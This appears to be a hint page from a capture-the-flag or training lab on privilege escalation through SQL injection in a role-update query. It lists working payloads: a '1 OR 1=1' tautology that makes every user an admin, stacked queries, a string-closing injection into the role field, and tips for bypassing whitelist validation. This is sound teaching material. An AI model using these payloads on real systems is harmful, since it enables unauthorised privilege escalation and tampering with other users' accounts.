💡 Challenge Hints — Privilege Escalation

Query Structure

The backend runs this query to update roles:

UPDATE users 
SET role = '{{ new_role }}' 
WHERE user_id = {{ user_id }}

Attack Vectors

  • Inject into user_id: Modify the WHERE clause to affect a broader set of users. 
    User ID: 1 OR 1=1
Role: admin
    This would set every user to admin role.
  • Stacked queries (if supported by the DB driver): 
    User ID: 1; UPDATE users SET role='admin' WHERE username='youruser'--
Role: user
  • Inject into role: Close the string and add subqueries. 
    Role: admin' WHERE username='youruser'--
  • Higher security levels: The application may validate role values against a whitelist. Try bypassing the validation by manipulating the query structure rather than the role value itself.

Remember: The goal is to escalate your own account to admin, not to attack other users. A true pentester documents findings without causing unnecessary impact.
